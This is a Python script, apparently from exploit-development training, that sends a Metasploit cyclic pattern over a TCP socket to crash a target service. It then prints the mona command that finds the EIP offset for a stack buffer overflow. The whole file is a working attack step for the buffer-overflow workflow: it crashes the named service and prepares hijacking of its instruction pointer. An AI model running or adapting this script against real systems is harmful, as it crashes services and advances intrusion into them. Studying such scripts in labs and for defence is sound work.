#!/usr/bin/python3
import socket, subprocess, sys, traceback
import argparse

"""
##############################################################

	determine EIP location by sending pattern string
	with necessary length to crash the application.
	and print mona command to determine position

##############################################################
"""


# parse args
parser = argparse.ArgumentParser(description="determine location of EIP", epilog="call the script with the buffer length determined from fuzzing")
parser.add_argument('-s', dest='server', type=str, help='server IP')
parser.add_argument('-p', dest='port', type=int, help='service port')
parser.add_argument('-c', dest='prefix', type=str, help='prefix / command')
parser.add_argument('-l', dest='length', type=int, help='crash buffer length')

# print help, when started without args
if len(sys.argv)==1:
    parser.print_help(sys.stderr)
    sys.exit(1)
    

args = parser.parse_args()


# init vars / set input
ip = args.server
port = args.port
prefix = args.prefix + " "
buflen = str( args.length + 400  )
seq = subprocess.run(["/usr/share/metasploit-framework/tools/exploit/pattern_create.rb","-l",buflen],capture_output=True)


# bof payload
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = str(seq.stdout).strip("\n")
postfix = ""

print(f"created pattern of length {buflen}")
print(seq.stdout)

buffer = prefix + overflow + retn + padding + payload + postfix

# send pattern payload
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print("\n\n#######################\n")
print("Status:")
try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send((buffer + "\r\n").encode())
    print("Done!")
except Exception as e:
    traceback.print_exc()
    print(e)
    print("Could not connect.")
    
# print mona command
print("\n#######################\n\n")
print(f"Let MONA calculate the EIP location via pattern:\n\n\t!mona findmsp -distance {buflen}\n\nCheck the following MONA log line for EIP location:\n\n\tEIP contains normal pattern : ... (offset XXXX)")
